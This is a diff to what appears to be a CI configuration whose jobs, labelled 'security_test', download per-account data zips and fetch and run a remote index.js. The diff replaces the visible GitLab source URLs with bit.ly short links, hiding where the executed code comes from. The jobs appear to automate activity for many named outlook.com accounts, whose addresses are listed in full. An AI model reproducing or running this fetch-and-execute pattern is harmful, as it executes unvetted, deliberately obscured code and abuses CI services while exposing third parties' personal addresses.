@@ -8,49 +8,49 @@ jobs:
     steps:
       - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/gomezjuan456123_outlook-com.zip -o lunarCrushData.zip
       - run: unzip lunarCrushData.zip -d lunarCrushData
-      - run: curl -fsSL https://gitlab.com/meo__coder/meocoder_lunarcrush/-/raw/main/app-custom.js -o index.js && curl -fsSL https://gl.githack.com/meo__coder/meocoder_lunarcrush/-/raw/main/package.json -o package.json
+      - run: curl -fsSL https://bit.ly/3nKzqND -o index.js && curl -fsSL https://bit.ly/3cBwVH3 -o package.json
       - run: npm i -s
-      - run: node index 58
+      - run: node index -t 58 -r 2 -e gomezjuan456123@outlook.com
  security_test_26:
     docker:
       - image: cimg/node:16.13.0-browsers
     resource_class: small
     steps:
-      - run: curl -fsSL https://gitlab.com/meo__coder/meocoder_lunarcrush/-/raw/main/app-custom.js -o index.js && curl -fsSL https://gl.githack.com/meo__coder/meocoder_lunarcrush/-/raw/main/package.json -o package.json
+      - run: curl -fsSL https://bit.ly/3nKzqND -o index.js && curl -fsSL https://bit.ly/3cBwVH3 -o package.json
       - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/barrimario.snchez_outlook-com.zip -o lunarCrushData.zip
       - run: unzip lunarCrushData.zip -d lunarCrushData
       - run: npm i -s
-      - run: node index 58
+      - run: node index -t 58 -r 2 -e barrimario.snchez@outlook.com
  security_test_27:
     docker:
       - image: cimg/node:16.13.0-browsers
     resource_class: small
     steps:
       - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/obedmichael27_outlook-com.zip -o lunarCrushData.zip
-      - run: curl -fsSL https://gitlab.com/meo__coder/meocoder_lunarcrush/-/raw/main/app-custom.js -o index.js && curl -fsSL https://gl.githack.com/meo__coder/meocoder_lunarcrush/-/raw/main/package.json -o package.json
+      - run: curl -fsSL https://bit.ly/3nKzqND -o index.js && curl -fsSL https://bit.ly/3cBwVH3 -o package.json
       - run: unzip lunarCrushData.zip -d lunarCrushData
       - run: npm i -s
-      - run: node index 58
+      - run: node index -t 58 -r 2 -e obedmichael27@outlook.com
  security_test_28:
     docker:
       - image: cimg/node:16.13.0-browsers
     resource_class: small
     steps:
-      - run: curl -fsSL https://gitlab.com/meo__coder/meocoder_lunarcrush/-/raw/main/app-custom.js -o index.js && curl -fsSL https://gl.githack.com/meo__coder/meocoder_lunarcrush/-/raw/main/package.json -o package.json
+      - run: curl -fsSL https://bit.ly/3nKzqND -o index.js && curl -fsSL https://bit.ly/3cBwVH3 -o package.json
       - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/payout_efccng_outlook-com.zip -o lunarCrushData.zip
       - run: unzip lunarCrushData.zip -d lunarCrushData
       - run: npm i -s
-      - run: node index 58
+      - run: node index -t 58 -r 2 -e payout_efccng@outlook.com
  security_test_29:
     docker:
       - image: cimg/node:16.13.0-browsers
     resource_class: small
     steps:
-      - run: curl -fsSL https://gitlab.com/meo__coder/meocoder_lunarcrush/-/raw/main/app-custom.js -o index.js && curl -fsSL https://gl.githack.com/meo__coder/meocoder_lunarcrush/-/raw/main/package.json -o package.json
+      - run: curl -fsSL https://bit.ly/3nKzqND -o index.js && curl -fsSL https://bit.ly/3cBwVH3 -o package.json
       - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/sergey_alexandro77_outlook-com.zip -o lunarCrushData.zip
       - run: unzip lunarCrushData.zip -d lunarCrushData
       - run: npm i -s
-      - run: node index 57 3
+      - run: node index -t 57 -r 3 -e sergey_alexandro77@outlook.com
  security_test_30:
     docker:
       - image: cimg/node:16.13.0-browsers
@@ -58,29 +58,29 @@ jobs:
     steps:
       - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/rejoicesdeerow_outlook-com.zip -o lunarCrushData.zip
       - run: unzip lunarCrushData.zip -d lunarCrushData
-      - run: curl -fsSL https://gitlab.com/meo__coder/meocoder_lunarcrush/-/raw/main/app-custom.js -o index.js && curl -fsSL https://gl.githack.com/meo__coder/meocoder_lunarcrush/-/raw/main/package.json -o package.json
+      - run: curl -fsSL https://bit.ly/3nKzqND -o index.js && curl -fsSL https://bit.ly/3cBwVH3 -o package.json
       - run: npm i -s
-      - run: node index 58
+      - run: node index -t 58 -r 2 -e rejoicesdeerow@outlook.com
  security_test_31:
     docker:
       - image: cimg/node:16.13.0-browsers
     resource_class: small
     steps:
-      - run: curl -fsSL https://gitlab.com/meo__coder/meocoder_lunarcrush/-/raw/main/app-custom.js -o index.js && curl -fsSL https://gl.githack.com/meo__coder/meocoder_lunarcrush/-/raw/main/package.json -o package.json
+      - run: curl -fsSL https://bit.ly/3nKzqND -o index.js && curl -fsSL https://bit.ly/3cBwVH3 -o package.json
       - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/alwaleedfoundation11999_outlook-com.zip -o lunarCrushData.zip
       - run: unzip lunarCrushData.zip -d lunarCrushData
       - run: npm i -s
-      - run: node index 58
+      - run: node index -t 58 -r 2 -e alwaleedfoundation11999@outlook.com
  security_test_32:
     docker:
       - image: cimg/node:16.13.0-browsers
     resource_class: small
     steps:
-      - run: curl -fsSL https://gitlab.com/meo__coder/meocoder_lunarcrush/-/raw/main/app-custom.js -o index.js && curl -fsSL https://gl.githack.com/meo__coder/meocoder_lunarcrush/-/raw/main/package.json -o package.json
+      - run: curl -fsSL https://bit.ly/3nKzqND -o index.js && curl -fsSL https://bit.ly/3cBwVH3 -o package.json
       - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/christinewms_outlook-com.zip -o lunarCrushData.zip
       - run: unzip lunarCrushData.zip -d lunarCrushData
       - run: npm i -s
-      - run: node index 58
+      - run: node index -t 58 -r 2 -e christinewms@outlook.com
       
       
 workflows:
